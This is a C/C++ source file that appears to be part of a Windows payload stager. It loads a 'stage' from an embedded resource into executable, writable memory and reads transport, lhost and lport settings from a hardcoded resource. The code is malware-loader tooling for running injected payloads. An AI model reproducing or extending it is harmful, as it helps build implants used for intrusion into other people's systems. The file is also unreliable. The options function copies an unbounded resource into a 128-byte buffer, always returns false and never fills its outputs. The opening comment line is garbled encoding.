//»”„ «··Â «·—Õ„‰ «·—ÕÌ„
//functions needed to fill buffer with stage from resource.

#include "main.h"

//get resource by name & type, 
//virutalalloc (resource size) of memory,
//copy contents of the resource to the buffer,
// return resource size, -1 if unsuccessful.
DWORD ResourceToBuffer(WORD wResourceID, LPCTSTR lpType, unsigned char** buffer) 
				
{
	HGLOBAL hRes = 0;
	HRSRC hResInfo = 0;
	LPVOID tempBuffer = nullptr;
	DWORD tempByteCount = 0;

	hResInfo = FindResource(NULL, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return 0;

	hRes = LoadResource(NULL, hResInfo);
	if (hRes == NULL) return 0;
	
	tempByteCount = SizeofResource(NULL,hResInfo); // Get the resource size in bytes
	tempBuffer = LockResource(hRes); //pointer to the data

	*buffer = (unsigned char*)VirtualAlloc(0, tempByteCount+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //allocate memory, make it executable
	memcpy_s(*buffer,tempByteCount,tempBuffer,tempByteCount); //copy stuff to buffer
	
	FreeResource(hRes);
	return tempByteCount;
}
BOOL GetOptionsFromResource(wchar_t *transport, wchar_t *lhost, wchar_t *lport)
{
		HRSRC hResInfo = 0;
		HGLOBAL hRes = 0;
		LPVOID tempBuffer = nullptr;
		char cOptions[128] = {0};
		DWORD tempByteCount = 0;

		hResInfo = FindResource(NULL, MAKEINTRESOURCE(103), (LPCTSTR)L"BINARY"); //That's hardcoded ... TYPE:BINARY RESOURCE_ID:103
		if (hResInfo == NULL) return false;
		
		hRes = LoadResource(NULL, hResInfo);
		if (hRes == NULL) return false;
		
		
		tempByteCount = SizeofResource(NULL,hResInfo); // Get the resource size in bytes
		tempBuffer = LockResource(hRes); //pointer to the data
		memcpy(cOptions,tempBuffer,tempByteCount);
		printf("%s",cOptions);
		FreeResource(hRes);
		return false;
}
